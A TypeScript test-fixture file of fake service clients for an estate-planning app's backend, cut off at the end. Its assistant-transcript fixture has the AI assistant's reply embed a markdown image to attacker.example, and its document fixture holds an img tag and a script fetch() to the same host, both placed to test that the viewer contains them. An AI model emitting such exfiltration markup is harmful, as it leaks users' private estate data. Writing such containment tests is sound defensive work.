import 'reflect-metadata';
import { createHash } from 'node:crypto';
import type { INestApplication } from '@nestjs/common';
import request from 'supertest';
import type { Response as SupertestResponse } from 'supertest';
import { createBffApp } from '../src/app';
import type {
  Asset,
  AssetDetail,
  AssetsClient,
  Beneficiaries,
  ChangeOwnershipInput,
  CommandAck,
  CreateAssetInput,
  DesignateBeneficiaryInput,
  HistoryEntry,
  NetWorth,
  RecordValuationInput,
  RetireAssetInput,
  UpdateDetailsInput,
} from '../src/assets-client';
import type {
  AnalysisName,
  AnalysisView,
  AssistantClient,
  Conversation,
  Transcript,
  Turn,
} from '../src/assistant-client';
import type { BffConfig } from '../src/config';
import type {
  Document,
  DocumentContent,
  DocumentDetail,
  DocumentTemplate,
  DocumentVersion,
  DocumentsClient,
  GenerateInput,
  GenerateResult,
  RegenerateInput,
  UploadInput,
  UploadResult,
} from '../src/documents-client';
import { bffError } from '../src/identity-client';
import type {
  ErasureStateDto,
  IdentityClient,
  IdentitySession,
  IssuedTokens,
  TotpEnrollment,
  EmailVerificationStatus,
  ResendOutcome,
  LiveSession,
} from '../src/identity-client';
import type { PersistedOperationsManifest } from '../src/persisted';
import type {
  ContactDetail,
  ContactInput,
  ContactSummary,
  FamilyMember,
  FamilyMemberInput,
  LinkInvitation,
  PermissionGrant,
  PermissionGrantInput,
  Profile,
  ProfileClient,
  RoleAssignment,
  RoleAssignmentInput,
  LinkedEstate,
  SaveProfileInput,
} from '../src/profile-client';
import type {
  DocumentEvidence,
  ExecutorCase,
  ReportableEstate,
  ReportSource,
  SettlementCase,
  SettlementClient,
  SettlementDistribution,
  SettlementSettings,
  SettlementStage,
  SettlementTask,
} from '../src/settlement-client';

export function testConfig(overrides: Partial<BffConfig> = {}): BffConfig {
  return {
    nodeEnv: 'test',
    port: 0,
    identityUrl: 'http://identity.test',
    assetsUrl: 'http://assets.test',
    aiAssistantUrl: 'http://assistant.test',
    documentsUrl: 'http://documents.test',
    profileUrl: 'http://profile.test',
    settlementUrl: 'http://settlement.test',
    vaultOrigin: 'http://vault.localhost:3010',
    operatorOrigin: 'http://operator.localhost:3011',
    persistedManifestPath: null,
    ...overrides,
  };
}

export const TOKENS: IssuedTokens = {
  accessToken: 'access-token-value-123',
  refreshToken: 'refresh-token-value-456',
  sessionId: 'a2c2e6a4-0000-4000-8000-000000000001',
  userId: 'a2c2e6a4-0000-4000-8000-000000000002',
};

/** Configurable in-memory fake; records every call. No network. */
export class FakeIdentityClient implements IdentityClient {
  registerCalls: Array<{ email: string; password: string }> = [];
  loginCalls: Array<{ email: string; password: string }> = [];
  refreshCalls: string[] = [];
  sessionCalls: string[] = [];
  totpEnrollCalls: string[] = [];
  totpVerifyCalls: Array<{ accessToken: string; code: string }> = [];
  stepUpCalls: Array<{ accessToken: string; code: string }> = [];
  exportDemoCalls: string[] = [];
  emailVerificationCalls: string[] = [];
  resendEmailVerificationCalls: string[] = [];
  verifyEmailCalls: Array<{ accessToken: string; code: string }> = [];
  accountEmailCalls: string[] = [];

  loginResult: IssuedTokens = TOKENS;
  refreshResult: IssuedTokens = TOKENS;
  sessionResult: IdentitySession | null = null;
  totpEnrollResult: TotpEnrollment = { otpauthUri: 'otpauth://totp/estate:user?secret=abc' };
  emailVerificationResult: EmailVerificationStatus = 'unverified';
  resendEmailVerificationResult: ResendOutcome = 'sent';
  verifyEmailError: Error | null = null;
  accountEmailResult = 'owner@example.com';
  /**
   * M24 PR2. The error slot matters here for one refusal in particular:
   * CONTENT_ERASED, which the real client mints from identity's 410 when a
   * decrypt races a legal erasure — a surface that treats it as a retryable
   * outage would pass against a double faithful only about values.
   */
  accountEmailError: Error | null = null;

  /**
   * ACCOUNT ERASURE (M25 PR4). Modelled as three independently settable
   * outcomes rather than one shared flag, because the three verbs disagree in
   * ways the surface depends on: `get` and `cancel` may answer null, `cancel`
   * answering a STATE means "too late", and only `request` refuses.
   *
   * THE ERROR SLOTS ARE THE POINT. A double faithful only about values would
   * let a component that mishandles OPEN_DEATH_REPORT pass — and that refusal
   * is the one carrying a remedy the owner has to be told about.
   */
  erasureCalls: Array<{ verb: 'get' | 'request' | 'cancel'; accessToken: string }> = [];
  erasureResult: ErasureStateDto | null = null;
  erasureRequestResult: ErasureStateDto | null = null;
  erasureCancelResult: ErasureStateDto | null = null;
  erasureError: Error | null = null;
  erasureRequestError: Error | null = null;

  loginError: Error | null = null;
  refreshError: Error | null = null;

  getAccountErasure(accessToken: string): Promise<ErasureStateDto | null> {
    this.erasureCalls.push({ verb: 'get', accessToken });
    return this.erasureError
      ? Promise.reject(this.erasureError)
      : Promise.resolve(this.erasureResult);
  }

  requestAccountErasure(accessToken: string): Promise<ErasureStateDto | null> {
    this.erasureCalls.push({ verb: 'request', accessToken });
    return this.erasureRequestError
      ? Promise.reject(this.erasureRequestError)
      : Promise.resolve(this.erasureRequestResult);
  }

  cancelAccountErasure(accessToken: string): Promise<ErasureStateDto | null> {
    this.erasureCalls.push({ verb: 'cancel', accessToken });
    return this.erasureError
      ? Promise.reject(this.erasureError)
      : Promise.resolve(this.erasureCancelResult);
  }

  register(email: string, password: string): Promise<void> {
    this.registerCalls.push({ email, password });
    return Promise.resolve();
  }

  login(email: string, password: string): Promise<IssuedTokens> {
    this.loginCalls.push({ email, password });
    if (this.loginError) {
      return Promise.reject(this.loginError);
    }
    return Promise.resolve(this.loginResult);
  }

  refresh(refreshToken: string): Promise<IssuedTokens> {
    this.refreshCalls.push(refreshToken);
    if (this.refreshError) {
      return Promise.reject(this.refreshError);
    }
    return Promise.resolve(this.refreshResult);
  }

  session(accessToken: string): Promise<IdentitySession | null> {
    this.sessionCalls.push(accessToken);
    return Promise.resolve(this.sessionResult);
  }

  totpEnroll(accessToken: string): Promise<TotpEnrollment> {
    this.totpEnrollCalls.push(accessToken);
    return Promise.resolve(this.totpEnrollResult);
  }

  totpVerify(accessToken: string, code: string): Promise<void> {
    this.totpVerifyCalls.push({ accessToken, code });
    return Promise.resolve();
  }

  stepUp(accessToken: string, code: string): Promise<void> {
    this.stepUpCalls.push({ accessToken, code });
    return Promise.resolve();
  }

  emailVerificationStatus(accessToken: string): Promise<EmailVerificationStatus> {
    this.emailVerificationCalls.push(accessToken);
    return Promise.resolve(this.emailVerificationResult);
  }

  accountEmail(accessToken: string): Promise<string> {
    this.accountEmailCalls.push(accessToken);
    return this.accountEmailError
      ? Promise.reject(this.accountEmailError)
      : Promise.resolve(this.accountEmailResult);
  }

  resendEmailVerification(accessToken: string): Promise<ResendOutcome> {
    this.resendEmailVerificationCalls.push(accessToken);
    return Promise.resolve(this.resendEmailVerificationResult);
  }

  verifyEmail(accessToken: string, code: string): Promise<void> {
    this.verifyEmailCalls.push({ accessToken, code });
    return this.verifyEmailError ? Promise.reject(this.verifyEmailError) : Promise.resolve();
  }

  exportDemo(accessToken: string): Promise<void> {
    this.exportDemoCalls.push(accessToken);
    return Promise.resolve();
  }

  logoutCalls: string[] = [];
  logoutError: Error | null = null;
  /** false models identity's 401: the ACCESS token expired, session still live. */
  logoutResult = true;
  logoutByRefreshCalls: string[] = [];
  logoutByRefreshError: Error | null = null;

  logout(accessToken: string): Promise<boolean> {
    this.logoutCalls.push(accessToken);
    return this.logoutError ? Promise.reject(this.logoutError) : Promise.resolve(this.logoutResult);
  }

  vaultHandoff: { code: string; expiresAt: string } = {
    code: 'handoff-code',
    expiresAt: '2026-08-08T00:01:00.000Z',
  };
  vaultHandoffError: Error | null = null;
  mintVaultHandoffCalls: string[] = [];

  mintVaultHandoff(accessToken: string): Promise<{ code: string; expiresAt: string }> {
    this.mintVaultHandoffCalls.push(accessToken);
    return this.vaultHandoffError
      ? Promise.reject(this.vaultHandoffError)
      : Promise.resolve(this.vaultHandoff);
  }

  // M21 PR3a. A SEPARATE recorder from the vault's, so a spec can assert the
  // two ceremonies do not share a call path — a fake that folded them would
  // make "the route is the selector" untestable at this layer.
  operatorHandoff: { code: string; expiresAt: string } = {
    code: 'operator-handoff-code',
    expiresAt: '2026-08-08T00:01:00.000Z',
  };
  operatorHandoffError: Error | null = null;
  mintOperatorHandoffCalls: string[] = [];

  mintOperatorHandoff(accessToken: string): Promise<{ code: string; expiresAt: string }> {
    this.mintOperatorHandoffCalls.push(accessToken);
    return this.operatorHandoffError
      ? Promise.reject(this.operatorHandoffError)
      : Promise.resolve(this.operatorHandoff);
  }

  // M16 paired devices + extension pairing. Same convention as above: a calls
  // recorder so a spec can assert THE CALLER'S OWN token was forwarded, a
  // mutable result, and an optional error so a peer refusal can be simulated.
  sessionsResult: LiveSession[] = [];
  sessionsError: Error | null = null;
  sessionsCalls: string[] = [];
  revokeSessionCalls: Array<{ accessToken: string; sessionId: string }> = [];
  revokeSessionError: Error | null = null;
  extensionPairing = { code: 'EP1-TEST', expiresAt: '2026-08-10T12:10:00.000Z' };
  extensionPairingError: Error | null = null;
  startExtensionPairingCalls: string[] = [];

  sessions(accessToken: string): Promise<LiveSession[]> {
    this.sessionsCalls.push(accessToken);
    return this.sessionsError
      ? Promise.reject(this.sessionsError)
      : Promise.resolve(this.sessionsResult);
  }

  revokeSession(accessToken: string, sessionId: string): Promise<void> {
    this.revokeSessionCalls.push({ accessToken, sessionId });
    return this.revokeSessionError ? Promise.reject(this.revokeSessionError) : Promise.resolve();
  }

  startExtensionPairing(accessToken: string): Promise<{ code: string; expiresAt: string }> {
    this.startExtensionPairingCalls.push(accessToken);
    return this.extensionPairingError
      ? Promise.reject(this.extensionPairingError)
      : Promise.resolve(this.extensionPairing);
  }

  /** M17 PR5 — the passkey vertical, faked with the same faithfulness rule as
   * every double here: defaults answer the happy shape, and a spec that needs
   * a refusal overrides per-case. */
  passkeysRows: Array<{
    id: string;
    nickname: string | null;
    isHardwareKey: boolean;
    createdAt: string;
    lastUsedAt: string | null;
  }> = [];

  webauthnRegisterOptions(_accessToken: string): Promise<unknown> {
    return Promise.resolve({ challenge: 'AQID', rp: { id: 'localhost' } });
  }

  webauthnRegister(_accessToken: string, _response: Record<string, unknown>): Promise<void> {
    return Promise.resolve();
  }

  webauthnStepUpOptions(_accessToken: string): Promise<unknown> {
    return Promise.resolve({ challenge: 'AQID' });
  }

  webauthnStepUp(
    _accessToken: string,
    _response: Record<string, unknown>,
  ): Promise<{ stepupExpiresAt: string }> {
    return Promise.resolve({ stepupExpiresAt: '2026-08-13T12:05:00.000Z' });
  }

  passkeys(_accessToken: string): Promise<
    Array<{
      id: string;
      nickname: string | null;
      isHardwareKey: boolean;
      createdAt: string;
      lastUsedAt: string | null;
    }>
  > {
    return Promise.resolve(this.passkeysRows);
  }

  revokePasskey(_accessToken: string, _id: string): Promise<void> {
    return Promise.resolve();
  }

  renamePasskey(_accessToken: string, _id: string, _nickname: string): Promise<void> {
    return Promise.resolve();
  }

  /**
   * M20 PR1. Records its arguments, because the resolver's whole job is to pass
   * both halves through untouched and a double that discarded them could not
   * tell a correct forward from a swapped one.
   */
  readonly changePasswordCalls: Array<{
    accessToken: string;
    currentPassword: string;
    newPassword: string;
  }> = [];
  changePasswordError: Error | null = null;

  changePassword(accessToken: string, currentPassword: string, newPassword: string): Promise<void> {
    this.changePasswordCalls.push({ accessToken, currentPassword, newPassword });
    return this.changePasswordError ? Promise.reject(this.changePasswordError) : Promise.resolve();
  }

  /**
   * M20 PR2, the address change. Each leg records its arguments for the same
   * reason as `changePassword`: the resolvers exist to forward values
   * untouched, and a double that dropped them could not tell a faithful forward
   * from a swapped or canonicalized one.
   */
  readonly requestEmailChangeCalls: Array<{
    accessToken: string;
    currentPassword: string;
    newEmail: string;
  }> = [];
  requestEmailChangeError: Error | null = null;

  readonly completeEmailChangeCalls: Array<{ accessToken: string; code: string }> = [];
  completeEmailChangeError: Error | null = null;

  readonly cancelEmailChangeCalls: string[] = [];
  cancelEmailChangeError: Error | null = null;

  requestEmailChange(
    accessToken: string,
    currentPassword: string,
    newEmail: string,
  ): Promise<void> {
    this.requestEmailChangeCalls.push({ accessToken, currentPassword, newEmail });
    return this.requestEmailChangeError
      ? Promise.reject(this.requestEmailChangeError)
      : Promise.resolve();
  }

  completeEmailChange(accessToken: string, code: string): Promise<void> {
    this.completeEmailChangeCalls.push({ accessToken, code });
    return this.completeEmailChangeError
      ? Promise.reject(this.completeEmailChangeError)
      : Promise.resolve();
  }

  cancelEmailChange(accessToken: string): Promise<void> {
    this.cancelEmailChangeCalls.push(accessToken);
    return this.cancelEmailChangeError
      ? Promise.reject(this.cancelEmailChangeError)
      : Promise.resolve();
  }

  /** M20 PR3, the password reset. Note there is NO accessToken in either
   * shape: the client methods have no token parameter, so a resolver could not
   * forward a session even by mistake. */
  readonly requestPasswordResetCalls: string[] = [];
  requestPasswordResetError: Error | null = null;

  readonly completePasswordResetCalls: Array<{ code: string; newPassword: string }> = [];
  completePasswordResetError: Error | null = null;

  requestPasswordReset(email: string): Promise<void> {
    this.requestPasswordResetCalls.push(email);
    return this.requestPasswordResetError
      ? Promise.reject(this.requestPasswordResetError)
      : Promise.resolve();
  }

  completePasswordReset(code: string, newPassword: string): Promise<void> {
    this.completePasswordResetCalls.push({ code, newPassword });
    return this.completePasswordResetError
      ? Promise.reject(this.completePasswordResetError)
      : Promise.resolve();
  }

  logoutByRefresh(refreshToken: string): Promise<void> {
    this.logoutByRefreshCalls.push(refreshToken);
    return this.logoutByRefreshError
      ? Promise.reject(this.logoutByRefreshError)
      : Promise.resolve();
  }
}

export const ASSET: Asset = {
  assetId: 'a2c2e6a4-0000-4000-8000-00000000000a',
  category: 'cash',
  title: 'Checking account',
  estValue: '1200.50',
  valuationAsOf: '2026-07-01',
  valuationSource: 'owner_estimate',
  ownershipPct: 100,
  inTrust: false,
  fundingStatus: null,
  status: 'live',
  retiredAt: null,
  version: '3',
};

export const ASSET_DETAIL: AssetDetail = {
  ...ASSET,
  costBasis: null,
  location: 'top drawer of the desk',
  notes: 'joint with Sam',
};

export const ASSET_ACK: CommandAck = {
  assetId: ASSET.assetId,
  eventId: 'e2c2e6a4-0000-4000-8000-00000000000e',
  version: '4',
  occurredAt: '2026-08-13T00:00:00.000Z',
  replayed: false,
};

export const HISTORY_ENTRY: HistoryEntry = {
  version: '1',
  eventId: 'e2c2e6a4-0000-4000-8000-00000000000f',
  eventType: 'AssetCreated',
  occurredAt: '2026-07-01T00:00:00.000Z',
  actorId: 'a2c2e6a4-0000-4000-8000-00000000000b',
  payload: { v: 1, type: 'AssetCreated', category: 'cash', title: 'Checking account' },
};

/** Configurable in-memory fake; records every call and the token it saw. */
export class FakeAssetsClient implements AssetsClient {
  listCalls: Array<{ accessToken: string; includeRetired: boolean }> = [];
  netWorthCalls: string[] = [];
  getCalls: Array<{ accessToken: string; assetId: string }> = [];
  historyCalls: Array<{ accessToken: string; assetId: string }> = [];
  createCalls: Array<{ accessToken: string; input: CreateAssetInput }> = [];
  commandCalls: Array<{
    method: 'updateDetails' | 'recordValuation' | 'changeOwnership' | 'retire';
    accessToken: string;
    assetId: string;
    input: unknown;
    expectedVersion: string | undefined;
  }> = [];

  listResult: Asset[] = [ASSET];
  netWorthResult: NetWorth = {
    totalValue: '1200.50',
    assetCount: 1,
    valuedAssetCount: 1,
    inTrustValue: '0',
  };
  getResult: AssetDetail = ASSET_DETAIL;
  historyResult: HistoryEntry[] = [HISTORY_ENTRY];
  ackResult: CommandAck = ASSET_ACK;
  listError: Error | null = null;
  getError: Error | null = null;
  commandError: Error | null = null;

  list(accessToken: string, includeRetired = false): Promise<Asset[]> {
    this.listCalls.push({ accessToken, includeRetired });
    return this.listError ? Promise.reject(this.listError) : Promise.resolve(this.listResult);
  }

  /**
   * A SEPARATE RESULT from `listResult`, deliberately.
   *
   * The owner's list and an estate's inventory are two routes with two
   * authorization models, and a double that answered both from one array would
   * let a resolver reading the wrong one pass — the failure mode being an
   * executor served their OWN assets under a decedent's heading.
   */
  listEstateCalls: Array<{ accessToken: string; ownerUserId: string }> = [];
  listEstateResult: Asset[] = [{ ...ASSET, assetId: 'estate-asset-1', title: 'Estate asset' }];
  listEstateError: Error | null = null;

  listEstate(accessToken: string, ownerUserId: string): Promise<Asset[]> {
    this.listEstateCalls.push({ accessToken, ownerUserId });
    return this.listEstateError
      ? Promise.reject(this.listEstateError)
      : Promise.resolve(this.listEstateResult);
  }

  netWorth(accessToken: string): Promise<NetWorth> {
    this.netWorthCalls.push(accessToken);
    return Promise.resolve(this.netWorthResult);
  }

  get(accessToken: string, assetId: string): Promise<AssetDetail> {
    this.getCalls.push({ accessToken, assetId });
    return this.getError ? Promise.reject(this.getError) : Promise.resolve(this.getResult);
  }

  history(accessToken: string, assetId: string): Promise<HistoryEntry[]> {
    this.historyCalls.push({ accessToken, assetId });
    return Promise.resolve(this.historyResult);
  }

  create(accessToken: string, input: CreateAssetInput): Promise<CommandAck> {
    this.createCalls.push({ accessToken, input });
    return this.commandError ? Promise.reject(this.commandError) : Promise.resolve(this.ackResult);
  }

  private command(
    method: 'updateDetails' | 'recordValuation' | 'changeOwnership' | 'retire',
    accessToken: string,
    assetId: string,
    input: unknown,
    expectedVersion: string | undefined,
  ): Promise<CommandAck> {
    this.commandCalls.push({ method, accessToken, assetId, input, expectedVersion });
    return this.commandError ? Promise.reject(this.commandError) : Promise.resolve(this.ackResult);
  }

  updateDetails(
    accessToken: string,
    assetId: string,
    input: UpdateDetailsInput,
    expectedVersion?: string,
  ): Promise<CommandAck> {
    return this.command('updateDetails', accessToken, assetId, input, expectedVersion);
  }

  recordValuation(
    accessToken: string,
    assetId: string,
    input: RecordValuationInput,
    expectedVersion?: string,
  ): Promise<CommandAck> {
    return this.command('recordValuation', accessToken, assetId, input, expectedVersion);
  }

  changeOwnership(
    accessToken: string,
    assetId: string,
    input: ChangeOwnershipInput,
    expectedVersion?: string,
  ): Promise<CommandAck> {
    return this.command('changeOwnership', accessToken, assetId, input, expectedVersion);
  }

  retire(
    accessToken: string,
    assetId: string,
    input: RetireAssetInput,
    expectedVersion?: string,
  ): Promise<CommandAck> {
    return this.command('retire', accessToken, assetId, input, expectedVersion);
  }

  beneficiariesCalls: Array<{ accessToken: string; assetId: string }> = [];
  designateCalls: Array<{
    accessToken: string;
    assetId: string;
    input: DesignateBeneficiaryInput;
    expectedVersion: string | undefined;
  }> = [];
  removeBeneficiaryCalls: Array<{
    accessToken: string;
    assetId: string;
    contactId: string;
    designation: string;
    clientEventId: string | undefined;
    expectedVersion: string | undefined;
  }> = [];
  beneficiariesResult: Beneficiaries = {
    assetId: ASSET.assetId,
    beneficiaries: [],
    totals: [],
  };
  beneficiaryError: Error | null = null;

  beneficiaries(accessToken: string, assetId: string): Promise<Beneficiaries> {
    this.beneficiariesCalls.push({ accessToken, assetId });
    return Promise.resolve(this.beneficiariesResult);
  }

  designateBeneficiary(
    accessToken: string,
    assetId: string,
    input: DesignateBeneficiaryInput,
    expectedVersion?: string,
  ): Promise<CommandAck> {
    this.designateCalls.push({ accessToken, assetId, input, expectedVersion });
    return this.beneficiaryError
      ? Promise.reject(this.beneficiaryError)
      : Promise.resolve(this.ackResult);
  }

  removeBeneficiary(
    accessToken: string,
    assetId: string,
    contactId: string,
    designation: string,
    clientEventId?: string,
    expectedVersion?: string,
  ): Promise<CommandAck> {
    this.removeBeneficiaryCalls.push({
      accessToken,
      assetId,
      contactId,
      designation,
      clientEventId,
      expectedVersion,
    });
    return this.beneficiaryError
      ? Promise.reject(this.beneficiaryError)
      : Promise.resolve(this.ackResult);
  }
}

/** One OK analysis, the shape the readiness page renders. */
export const ANALYSIS: AnalysisView = {
  status: 'OK',
  reason: null,
  findings: [
    {
      code: 'asset_not_titled_in_trust',
      severity: 'high',
      subject: { kind: 'asset', ref: ASSET.assetId, label: 'The lake house' },
      detail: { category: 'real_estate', estValue: '250000.00' },
    },
  ],
  disclaimer: 'Automated analysis for education only. Not legal or tax advice.',
};

/** Configurable in-memory fake; records every call and the token it saw. */
export class FakeAssistantClient implements AssistantClient {
  analysisCalls: Array<{ accessToken: string; name: AnalysisName }> = [];
  consentsCalls: string[] = [];
  grantCalls: Array<{ accessToken: string; scope: string }> = [];
  revokeCalls: Array<{ accessToken: string; scope: string }> = [];

  /** Per-analysis overrides; anything unset answers ANALYSIS. */
  analysisResults = new Map<AnalysisName, AnalysisView>();
  analysisError: Error | null = null;
  consentsResult: string[] = ['assistant.enabled'];
  grantError: Error | null = null;

  analysis(accessToken: string, name: AnalysisName): Promise<AnalysisView> {
    this.analysisCalls.push({ accessToken, name });
    if (this.analysisError) {
      return Promise.reject(this.analysisError);
    }
    return Promise.resolve(this.analysisResults.get(name) ?? ANALYSIS);
  }

  consents(accessToken: string): Promise<string[]> {
    this.consentsCalls.push(accessToken);
    return Promise.resolve(this.consentsResult);
  }

  grantConsent(accessToken: string, scope: string): Promise<string[]> {
    this.grantCalls.push({ accessToken, scope });
    if (this.grantError) {
      return Promise.reject(this.grantError);
    }
    this.consentsResult = [...new Set([...this.consentsResult, scope])];
    return Promise.resolve(this.consentsResult);
  }

  revokeConsent(accessToken: string, scope: string): Promise<string[]> {
    this.revokeCalls.push({ accessToken, scope });
    this.consentsResult = this.consentsResult.filter((granted) => granted !== scope);
    return Promise.resolve(this.consentsResult);
  }

  // ---- the conversation surface (M11) --------------------------------------

  conversationsCalls: string[] = [];
  transcriptCalls: Array<{ accessToken: string; conversationId: string }> = [];
  startCalls: string[] = [];
  sendCalls: Array<{ accessToken: string; conversationId: string; text: string }> = [];
  deleteCalls: Array<{ accessToken: string; conversationId: string }> = [];

  conversationsResult: Conversation[] = [CONVERSATION];
  transcriptResult: Transcript = TRANSCRIPT;
  turnResult: Turn = TURN;
  conversationError: Error | null = null;

  conversations(accessToken: string): Promise<Conversation[]> {
    this.conversationsCalls.push(accessToken);
    return this.reject() ?? Promise.resolve(this.conversationsResult);
  }

  transcript(accessToken: string, conversationId: string): Promise<Transcript> {
    this.transcriptCalls.push({ accessToken, conversationId });
    return this.reject() ?? Promise.resolve(this.transcriptResult);
  }

  startConversation(accessToken: string): Promise<Conversation> {
    this.startCalls.push(accessToken);
    return this.reject() ?? Promise.resolve(CONVERSATION);
  }

  sendMessage(accessToken: string, conversationId: string, text: string): Promise<Turn> {
    this.sendCalls.push({ accessToken, conversationId, text });
    return this.reject() ?? Promise.resolve(this.turnResult);
  }

  deleteConversation(accessToken: string, conversationId: string): Promise<void> {
    this.deleteCalls.push({ accessToken, conversationId });
    return this.reject() ?? Promise.resolve();
  }

  /** One place to inject a downstream failure across the conversation surface. */
  private reject<T>(): Promise<T> | null {
    return this.conversationError === null ? null : Promise.reject(this.conversationError);
  }
}

export const CONVERSATION: Conversation = {
  conversationId: 'c0nv0000-0000-4000-8000-00000000000c',
  createdAt: '2026-08-05T10:00:00.000Z',
  updatedAt: '2026-08-05T10:05:00.000Z',
};

/**
 * A transcript carrying an EXFILTRATION PAYLOAD as the assistant's text, so the
 * tests downstream of here are exercising the case docs/03 §6d cares about
 * rather than a friendly sentence.
 */
export const TRANSCRIPT: Transcript = {
  conversationId: CONVERSATION.conversationId,
  messages: [
    {
      messageId: 'm0000000-0000-4000-8000-000000000001',
      seq: 0,
      role: 'user',
      text: 'what do I own?',
      createdAt: '2026-08-05T10:00:00.000Z',
    },
    {
      messageId: 'm0000000-0000-4000-8000-000000000002',
      seq: 1,
      role: 'assistant',
      text: 'You have one property. ![](https://attacker.example/?d=leak)',
      createdAt: '2026-08-05T10:00:05.000Z',
    },
  ],
};

export const TURN: Turn = {
  conversationId: CONVERSATION.conversationId,
  messageId: 'm0000000-0000-4000-8000-000000000003',
  text: 'Your estate looks in order.',
  toolCalls: 1,
};

// ---- documents (M12) --------------------------------------------------------

export const TEMPLATE: DocumentTemplate = {
  templateId: 'd0000000-0000-4000-8000-00000000000t',
  docType: 'will',
  state: 'CA',
  version: 1,
  legalReviewAt: '2026-07-23T00:00:00.000Z',
  executionRequirements: { witnesses: 2, notarization: false, selfProvingAffidavit: false },
  variables: [
    {
      name: 'testatorName',
      kind: 'text',
      label: 'Full legal name',
      required: true,
      maxLength: 200,
    },
    { name: 'hasMinorChildren', kind: 'boolean', label: 'Minor children?', required: true },
  ],
};

export const DOCUMENT: Document = {
  documentId: 'd0000000-0000-4000-8000-00000000000d',
  docType: 'will',
  source: 'generated',
  title: 'Last Will and Testament',
  currentVersion: 1,
  executionStatus: 'generated',
  executedAt: null,
  legalHold: false,
  sealed: false,
  templateId: TEMPLATE.templateId,
  createdAt: '2026-08-05T10:00:00.000Z',
  updatedAt: '2026-08-05T10:00:00.000Z',
};

/**
 * The single-document read, carrying the ladder THIS document may climb. CA's
 * will template requires two witnesses and no notary, so from `generated` the
 * only rung is `signed` — computed by the service, never by a client.
 */
export const DOCUMENT_DETAIL: DocumentDetail = { ...DOCUMENT, allowedTransitions: ['signed'] };

export const DOCUMENT_VERSION: DocumentVersion = {
  version: 1,
  contentSha256: 'a'.repeat(64),
  sizeBytes: 512,
  mime: 'text/html',
  createdAt: '2026-08-05T10:00:00.000Z',
};

/**
 * Content carrying an EXFILTRATION PAYLOAD, on the TRANSCRIPT precedent: the
 * viewer's job is to contain document markup, so the fixtures downstream of
 * here exercise that rather than a friendly paragraph.
 */
export const DOCUMENT_CONTENT: DocumentContent = {
  documentId: DOCUMENT.documentId,
  version: 1,
  mime: 'text/html',
  contentSha256: DOCUMENT_VERSION.contentSha256,
  encoding: 'utf8',
  content:
    '<!doctype html><html><body><h1>Last Will</h1>' +
    '<img src="https://attacker.example/?d=leak"><script>fetch("https://attacker.example")</script>' +
    '</body></html>',
};

/** Configurable in-memory fake; records every call and the token it saw. */
export class FakeDocumentsClient implements DocumentsClient {
  templatesCalls: Array<{ accessToken: string; state: string }> = [];
  listCalls: string[] = [];
  getCalls: Array<{ accessToken: string; documentId: string }> = [];
  versionsCalls: Array<{ accessToken: string; documentId: string }> = [];
  contentCalls: Array<{ accessToken: string; documentId: string; version: number }> = [];
  generateCalls: Array<{ accessToken: string; input: GenerateInput }> = [];
  regenerateCalls: Array<{ accessToken: string; documentId: string; input: RegenerateInput }> = [];

  searchCalls: Array<{ accessToken: string; query: string }> = [];
  uploadCalls: Array<{ accessToken: string; input: UploadInput }> = [];
  statusCalls: Array<{
    accessToken: string;
    documentId: string;
    status: string;
    executedAt?: string;
  }> = [];
  removeCalls: Array<{ accessToken: string; documentId: string }> = [];

  templatesResult: DocumentTemplate[] = [TEMPLATE];
  listResult: Document[] = [DOCUMENT];
  getResult: DocumentDetail = DOCUMENT_DETAIL;
  searchResult: Document[] = [DOCUMENT];
  uploadResult: UploadResult = {
    documentId: 'd0000000-0000-4000-8000-00000000000u',
    version: 1,
    contentSha256: 'e'.repeat(64),
    executionStatus: 'draft',
    ocrIndexed: true,
  };
  versionsResult: DocumentVersion[] = [DOCUMENT_VERSION];
  contentResult: DocumentContent = DOCUMENT_CONTENT;
  generateResult: GenerateResult = {
    documentId: DOCUMENT.documentId,
    version: 1,
    contentSha256: DOCUMENT_VERSION.contentSha256,
    executionStatus: 'generated',
  };
  documentsError: Error | null = null;

  templates(accessToken: string, state: string): Promise<DocumentTemplate[]> {
    this.templatesCalls.push({ accessToken, state });
    return this.reject() ?? Promise.resolve(this.templatesResult);
  }

  list(accessToken: string): Promise<Document[]> {
    this.listCalls.push(accessToken);
    return this.reject() ?? Promise.resolve(this.listResult);
  }

  get(accessToken: string, documentId: string): Promise<DocumentDetail> {
    this.getCalls.push({ accessToken, documentId });
    return this.reject() ?? Promise.resolve(this.getResult);
  }

  search(accessToken: string, query: string): Promise<Document[]> {
    this.searchCalls.push({ accessToken, query });
    return this.reject() ?? Promise.resolve(this.searchResult);
  }

  upload(accessToken: string, input: UploadInput): Promise<UploadResult> {
    this.uploadCalls.push({ accessToken, input });
    return this.reject() ?? Promise.resolve(this.uploadResult);
  }

  setStatus(
    accessToken: string,
    documentId: string,
    status: string,
    executedAt?: string,
  ): Promise<DocumentDetail> {
    this.statusCalls.push({
      accessToken,
      documentId,
      status,
      ...(executedAt === undefined ? {} : { executedAt }),
    });
    return (
      this.reject() ??
      Promise.resolve({ ...this.getResult, executionStatus: status, allowedTransitions: [] })
    );
  }

  remove(accessToken: string, documentId: string): Promise<void> {
    this.removeCalls.push({ accessToken, documentId });
    return this.reject() ?? Promise.resolve();
  }

  versions(accessToken: string, documentId: string): Promise<DocumentVersion[]> {
    this.versionsCalls.push({ accessToken, documentId });
    return this.reject() ?? Promise.resolve(this.versionsResult);
  }

  content(accessToken: string, documentId: string, version: number): Promise<DocumentContent> {
    this.contentCalls.push({ accessToken, documentId, version });
    return this.reject() ?? Promise.resolve(this.contentResult);
  }

  generate(accessToken: string, input: GenerateInput): Promise<GenerateResult> {
    this.generateCalls.push({ accessToken, input });
    return this.reject() ?? Promise.resolve(this.generateResult);
  }

  regenerate(
    accessToken: string,
    documentId: string,
    input: RegenerateInput,
  ): Promise<GenerateResult> {
    this.regenerateCalls.push({ accessToken, documentId, input });
    return this.reject() ?? Promise.resolve(this.generateResult);
  }

  private reject<T>(): Promise<T> | null {
    return this.documentsError === null ? null : Promise.reject(this.documentsError);
  }
}

export const PROFILE: Profile = {
  userId: 'a1111111-1111-4111-8111-111111111111',
  legalName: 'Jane Quincy Public',
  dob: '1950-04-02',
  ssnLast4: '6789',
  address: '1 Main St',
  phone: '555-0100',
  occupation: 'Architect',
  maritalStatus: 'married',
  stateOfResidence: 'AZ',
};

export const FAMILY_MEMBER: FamilyMember = {
  id: 'c0000000-0000-4000-8000-000000000001',
  relation: 'child',
  name: 'Kiddo Public',
  dob: '2015-06-01',
  isMinor: true,
  notes: null,
};

export const CONTACT_SUMMARY: ContactSummary = {
  id: 'f0000000-0000-4000-8000-000000000001',
  ownerUserId: PROFILE.userId,
  name: 'Alice Attorney',
  relationship: 'friend',
